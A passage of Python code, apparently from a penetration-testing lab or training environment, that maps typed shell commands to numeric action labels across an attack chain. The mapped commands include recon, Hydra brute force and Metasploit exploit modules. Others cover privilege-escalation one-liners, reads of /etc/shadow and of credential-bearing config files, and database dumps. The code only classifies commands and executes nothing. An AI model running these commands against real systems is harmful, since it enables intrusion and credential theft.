    return get_action(action_id).get("command_template")


def get_parser_family(action_id: int) -> str | None:
    return get_action(action_id).get("parser_family")

def get_expected_events(action_id: int) -> list[str]:
    return get_action(action_id).get("expected_events", [])


def get_placeholders(action_id: int) -> list[str]:
    return get_action(action_id).get("placeholders", [])


def get_preconditions(action_id: int) -> dict:
    return get_action(action_id).get("preconditions", {})


def extract_action_id_from_cmd(cmd: str) -> int:
    """
    Extracts the closest semantic action_id from a free-form command.
    Used mainly in observation mode to map human commands to action labels.
    """
    if not cmd:
        return None

    s = cmd.strip().lower()
    s = re.sub(r"\s+", " ", s)

    # Windows (acepta "ipconfig" y "ipconfig /all")
    if s == "ipconfig" or s.startswith("ipconfig "):
        return 1
    if s == "arp" or s.startswith("arp "):
        return 2
    if s == "route" or s.startswith("route "):
        return 3
    # ping -n 1 <ipv4>
    if re.fullmatch(r"ping -n 1 (?:\d{1,3}\.){3}\d{1,3}", s):
        return 4
    # ping -n 1 <ipv4> (y también ping <ipv4> como fallback MVP)
    if re.fullmatch(r"ping (?:\d{1,3}\.){3}\d{1,3}", s):
        return 4
    
    # ============================================================
    # Local attacker context
    # ============================================================

    if s == "hostname":
        return 100
    if s == "ip a":
        return 101
    if s == "ip r":
        return 102
    if s == "ip neigh":
        return 103
    if s == "ss -tulpn":
        return 104
    if re.fullmatch(r"ping -c 1(?: -w \d+)?(?: -w \d+)? (?:\d{1,3}\.){3}\d{1,3}", s):
        return 105
    if s.startswith("traceroute "):
        return 106
    
     # ============================================================
    # Recon / discovery
    # ============================================================

    if s.startswith("nmap -sn "):
        return 200
    if s == "arp-scan --localnet":
        return 201
    if s.startswith("arp-scan "):
        return 202
    if s.startswith("netdiscover -r "):
        return 203
    if s.startswith("fping ") and " -g " in s:
        return 204

    # ============================================================
    # Port scanning
    # ============================================================

    if s.startswith("nmap ") and "--top-ports" in s and "--open" in s and "-su" not in s:
        return 210
    if s.startswith("nmap ") and "-p-" in s and "--open" in s:
        return 211
    if s.startswith("nmap ") and " -f " in s:
        return 212
    if s.startswith("nmap ") and "-su" in s:
        return 213

    # ============================================================
    # Service detection
    # ============================================================

    if s.startswith("nmap ") and "-sv" in s and "-sc" in s:
        return 220
    if s.startswith("nmap ") and "-sv" in s and "--version-light" in s:
        return 221
    if s.startswith("nmap ") and " -a " in s:
        return 222
    if s.startswith("nmap ") and "-sc" in s:
        return 230

    # ============================================================
    # HTTP / HTTPS
    # ============================================================

    if s.startswith("curl -i ") or s.startswith("curl -i --") or s.startswith("curl -k -i "):
        return 300
    if s.startswith("curl -l ") or s.startswith("curl -l --") or "curl -l" in s:
        return 301
    if s.startswith("curl -k -i ") and "https://" in s:
        return 302
    if "robots.txt" in s and s.startswith("curl "):
        return 303
    if s.startswith("gobuster dir "):
        return 310
    if s.startswith("feroxbuster "):
        return 311
    if s.startswith("nikto "):
        return 312
    if s.startswith("whatweb "):
        return 313
    if s.startswith("wafw00f "):
        return 314

    # ============================================================
    # SMB
    # ============================================================

    if s.startswith("smbclient -l ") or s.startswith("smbclient -l//") or s.startswith("smbclient -l //"):
        return 320
    if s.startswith("enum4linux "):
        return 321
    if s.startswith("rpcclient ") and "enumdomusers" in s:
        return 322
    if s.startswith("nmap ") and "smb-os-discovery" in s:
        return 323
    if s.startswith("nmap ") and "smb-protocols" in s:
        return 324

    # ============================================================
    # FTP
    # ============================================================

    if s.startswith("nc ") or s.startswith("netcat "):
        return 330
    if s.startswith("nmap ") and "ftp-anon" in s:
        return 331
    if s.startswith("nmap ") and "ftp-" in s:
        return 332

    # ============================================================
    # SSH
    # ============================================================

    if s.startswith("nmap ") and ("ssh2-enum-algos" in s or "ssh-hostkey" in s):
        return 341

    # ============================================================
    # DNS
    # ============================================================

    if s.startswith("dig ") and "version.bind" in s:
        return 350
    if s.startswith("dig ") and " any" in s:
        return 351
    if s.startswith("dig axfr "):
        return 352

    # ============================================================
    # NFS / RPC
    # ============================================================

    if s.startswith("showmount -e "):
        return 360
    if s.startswith("rpcinfo -p "):
        return 361
    
    # ============================================================
    # Databases / RDP / VNC
    # ============================================================

    if s.startswith("nmap ") and ("nfs-showmount" in s or "nfs-ls" in s or "nfs-statfs" in s):
        return 362
    if s.startswith("nmap ") and "mysql-info" in s:
        return 370
    if s.startswith("nmap ") and "pgsql" in s:
        return 371
    if s.startswith("nmap ") and ("rdp-enum-encryption" in s or "rdp-ntlm-info" in s):
        return 380
    if s.startswith("nmap ") and "vnc-info" in s:
        return 381

    # ============================================================
    # Vulnerability discovery
    # ============================================================

    if s.startswith("searchsploit "):
        return 400
    if s.startswith("nmap ") and "--script vuln" in s:
        return 401
    if s.startswith("nmap ") and "smb-vuln" in s:
        return 410
    if s.startswith("nmap ") and "ssl-enum-ciphers" in s:
        return 412
    if s.startswith("nmap ") and "ftp-vsftpd-backdoor" in s:
        return 413

    # ============================================================
    # Credential attacks / lab auth checks
    # ============================================================

    if s.startswith("hydra ") and "ssh://" in s:
        return 500
    if s.startswith("hydra ") and "ftp://" in s:
        return 501
    if s.startswith("hydra ") and "http-post-form" in s:
        return 502
    
    if s.startswith("sshpass ") and " ssh " in s:
        return 520
    if s.startswith("hydra ") and "telnet://" in s:
        return 521
    if s.startswith("mysql ") and "select version()" in s:
        return 522
    if s.startswith("pgpassword=") and "psql " in s:
        return 523
    if s.startswith("curl ") and "/manager/html" in s and "-u " in s:
        return 524

    # ============================================================
    # Metasploit lab exploitation
    # ============================================================

    if s.startswith("msfconsole ") and "usermap_script" in s:
        return 600
    if s.startswith("msfconsole ") and "vsftpd_234_backdoor" in s:
        return 601
    if s.startswith("msfconsole ") and "distcc_exec" in s:
        return 602
    if s.startswith("msfconsole ") and "tomcat_mgr_upload" in s:
        return 603
    if s.startswith("msfconsole ") and "postgres_payload" in s:
        return 604
    if s.startswith("msfconsole ") and "unreal_ircd_3281_backdoor" in s:
        return 605
    if re.fullmatch(r"nc -nv(?: -w \d+)? (?:\d{1,3}\.){3}\d{1,3} 1524", s):
        return 606
    if s.startswith("msfconsole ") and "rlogin_login" in s:
        return 607
    if s.startswith("msfconsole ") and "java_rmi_server" in s:
        return 608
    # ============================================================
    # Post-exploitation
    # ============================================================

    if s == "whoami":
        return 700
    if s == "uname -a":
        return 701
    if s == "id":
        return 702
    if s == "ip route":
        return 705
    if s == "ss -tulnp":
        return 706
    if s == "netstat -tulnp":
        return 707
    if s == "cat /etc/passwd":
        return 708
    if s == "cat /etc/passwd | grep home":
        return 709
    if s == "ps aux":
        return 710
    if s == "env":
        return 711
    if s == "sudo -l":
        return 712
    if s == "ls -l /etc/sudoers":
        return 713
    if s.startswith("find / -perm -4000"):
        return 714
    if s == "nmap --interactive":
        return 715
    if s.startswith("find . -exec /bin/sh -p"):
        return 716
    if s == "cat /etc/shadow":
        return 717
    if s == "ls -la /etc/ssh":
        return 718
    if s == "cat /etc/crontab":
        return 719
    if s.startswith("msfconsole ") and "post/linux/gather/enum_system" in s:
        return 730
    if s.startswith("msfconsole ") and "post/linux/gather/enum_configs" in s:
        return 731
    if s.startswith("msfconsole ") and "post/linux/gather/enum_network" in s:
        return 732
    if s.startswith("msfconsole ") and "local_exploit_suggester" in s:
        return 733
    if s.startswith("msfconsole ") and "post/multi/manage/autoroute" in s:
        return 760
    if s.startswith("msfconsole ") and "auxiliary/server/socks_proxy" in s:
        return 761
    if s.startswith("proxychains nmap ") and "-st" in s and "-pn" in s:
        return 762
    if s.startswith("msfconsole ") and "portfwd add" in s:
        return 763
    if s.startswith("mysql ") and "-h 127.0.0.1" in s:
        return 764
    if s.startswith("mysqldump ") and "-h 127.0.0.1" in s:
        return 765
    if s.startswith("grep -r \"pass\" -ni /var/www"):
        return 780
    if s.startswith("grep -r \"db\" -ni /var/www"):
        return 781
    if s == "cat /var/www/dvwa/config/config.inc.php":
        return 782
    if s == "cat /etc/phpmyadmin/config-db.php":
        return 783
    if s == "cat /var/www/tikiwiki/db/local.php":
        return 784
    if "tar -cvf /tmp/mysql.tar" in s:
        return 790
    if "tar -cvf /tmp/pgsql.tar" in s:
        return 791
    if s.startswith("download "):
        return 792
    return None